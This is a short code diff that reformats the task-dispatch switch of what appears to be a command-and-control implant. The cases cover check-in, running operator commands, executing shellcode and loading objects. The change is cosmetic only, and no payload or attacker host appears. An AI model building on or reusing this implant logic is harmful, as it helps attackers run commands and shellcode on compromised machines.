@@ -221,10 +221,18 @@ namespace Dispatcher {
         MemCopy(&ctx->session.current_taskid, &task_id, sizeof(uint32_t));
 
         switch (UnpackUint32(&parser)) {
-            case TypeCheckin:   MemSet(&ctx->session.checkin, true, sizeof(bool)); break;
-            case TypeTasking:   ExecuteCommand(parser); break;
-            case TypeExecute:   ExecuteShellcode(parser); break;
-            case TypeObject:    LoadObject(parser); break;
+            case TypeCheckin:
+                MemSet(&ctx->session.checkin, true, sizeof(bool));
+                break;
+            case TypeTasking:
+                ExecuteCommand(parser);
+                break;
+            case TypeExecute:
+                ExecuteShellcode(parser);
+                break;
+            case TypeObject:
+                LoadObject(parser);
+                break;
 
             default:
                 break;
